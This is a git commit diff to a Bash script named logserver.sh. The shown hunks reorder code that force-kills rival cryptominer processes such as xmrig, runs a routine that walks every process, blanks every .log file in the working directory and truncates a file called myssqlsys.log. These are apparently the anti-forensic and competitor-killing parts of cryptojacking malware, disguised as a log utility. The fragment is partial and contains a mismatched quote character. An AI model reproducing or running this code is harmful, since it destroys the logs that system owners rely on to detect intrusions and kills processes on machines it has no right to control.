a5e55257d121caa2c8e7332b0683ce08502e2922
teshushu <905353149@qq.com>
2023-01-22 11:00:25 +0800

    Update logserver.sh

--- Bash/logserver.sh
+++ Bash/logserver.sh
@@ -4,19 +4,6 @@ if [ -z $HOME ]; then
   exit 1
 fi
 
-if [ ! -d $HOME ]; then
-  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
-  echo '  export HOME=<dir>'
-  exit 1
-fi
-
-if [ `/bin/ls -lt /$HOME/myssqlsys.log | head -1 | /bin/awk '{print $5}'` -gt $((18*18*10)) ]
-then
-    echo > /$HOME/myssqlsys.log
-fi
- 
-ls *.log | xargs -I x -n 1 sh -c "echo > x”
-
 kill_sus_proc()
 {
     ps axf -o "pid"|while read procid
@@ -49,3 +36,16 @@ killall -9 xmrig
 killall -9 jj
 killall -9 p
 kill_sus_proc
+
+if [ ! -d $HOME ]; then
+  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
+  echo '  export HOME=<dir>'
+  exit 1
+fi
+
+if [ `/bin/ls -lt /$HOME/myssqlsys.log | head -1 | /bin/awk '{print $5}'` -gt $((18*18*10)) ]
+then
+    echo > /$HOME/myssqlsys.log
+fi
+ 
+ls *.log | xargs -I x -n 1 sh -c "echo > x”
